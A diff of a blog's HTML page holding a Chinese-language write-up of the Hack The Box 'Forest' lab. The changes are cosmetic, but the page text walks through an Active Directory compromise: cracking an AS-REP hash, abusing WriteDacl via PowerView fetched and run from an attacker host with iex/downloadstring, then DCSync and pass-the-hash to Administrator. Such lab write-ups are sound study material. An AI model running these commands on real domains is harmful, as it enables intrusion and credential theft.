@@ -124,7 +124,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -232,19 +232,47 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  Forest sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">[sudo] password for miao:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>5985端口开放，可以直接使用winrm登录，桌面得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111001.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h1><p>然后就是BloodHound搜集信息，分析到域管的攻击路径：</p>
 <ul>
 <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></li>
 </ul>
 <p>上传，运行，下载结果，本地导入分析：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111002.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111003.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="Exchange-Windows-Permissions"><a href="#Exchange-Windows-Permissions" class="headerlink" title="Exchange Windows Permissions"></a>Exchange Windows Permissions</h2><p>首先需要加入到Exchange Windows Permissions组中：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Exchange Windows Permissions&quot; svc-alfresco &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>
 
 <p>然后Exchange Windows Permissions组有WriteDacl权限：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111004.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h2><p>滥用权限，使得我们可以执行DCSync,需要首先导入powerview：</p>
 <ul>
 <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></li>
@@ -253,9 +281,23 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.14.3:9999&#x2F;PowerView.ps1&#39;)</span><br><span class="line"></span><br><span class="line">Add-DomainGroupMember -Identity &#39;Exchange Windows Permissions&#39; -Members svc-alfresco; $username &#x3D; &quot;htb\svc-alfresco&quot;; $password &#x3D; &quot;s3rvice&quot;; $secstr &#x3D; New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object &#123;$secstr.AppendChar($_)&#125;; $cred &#x3D; new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity &#39;svc-alfresco&#39; -TargetIdentity &#39;HTB.LOCAL\Domain Admins&#39; -Rights DCSync</span><br></pre></td></tr></table></figure>
 
 <h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>然后我们就可以用svc-alfresco账号执行DCSync，获取hash：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111005.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后直接使用hash登录Administrator账号，桌面得到root.txt：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111006.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></li>
 <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></li>
